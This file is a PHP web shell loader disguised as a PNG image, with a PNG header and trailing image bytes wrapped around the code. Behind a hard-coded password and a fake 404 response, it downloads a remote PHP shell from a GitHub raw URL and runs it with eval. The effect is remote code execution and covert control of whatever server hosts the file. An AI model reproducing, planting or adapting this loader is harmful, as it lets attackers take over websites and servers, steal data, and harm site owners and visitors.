‰PNG

<?php
/*
// Author : Mr.J4CK
// Team   : Force Cyber Team
// Email  : jackxcode404@gmail.com
*/
set_time_limit(0);
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "J4CKGanzz";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
	$_SESSION['forbidden'] = $pass;
}
if($_GET['page'] == "blank") {
	echo "<a href='?'>Back</a>";
	exit();
}
if(isset($_REQUEST['logout'])) {
	session_destroy();
}
if(!($_SESSION['forbidden'])) {
?>
	<!DOCTYPE html>
<html>
<head>
<title>-=[Login Slurrr]=-</title>
<meta name="theme color" content="#00BFFF"> </meta>
<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
<script type="text/JavaScript">
function killCopy(e){
return false
}
function reEnable(){
return true
}
document.onselectstart=new Function ("return false")
if (window.sidebar){
document.onmousedown=killCopy
document.onclick=reEnable
}
</script>
<link href="https://fonts.googleapis.com/css?family=Rye" rel="stylesheet">
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
  <body bgcolor="black">
	<center><img src="https://i.ibb.co/b5nNXYm/Mini-Shell-Mr-7-Mind.png" style="opacity:0.5; width:200px; height:300px";></center></center>
	<center><h1><center><font color="#00BFFF" face="Rye">-=[ Jual Hp Beli Kuota ]=-</font><br>
	</center>
	<form method="post">
		<input type="password" name="password" placeholder="Password">
		<input type="submit" value="MASUK!">
		<br>
		<br>
		<?php echo $_SESSIOM['forbidden']; ?>
		</form>
		  </td>
		 </table>
    </center>
  </body>
</html>
<?php
exit;
}
?>
<?php
$url = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
if ($fileContents === false) {
    die('[!] Cannot Get Gecko File : https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php ');
}
eval("?>" . $fileContents);
?>::œX    IDATxœìÁ   €þ¯î
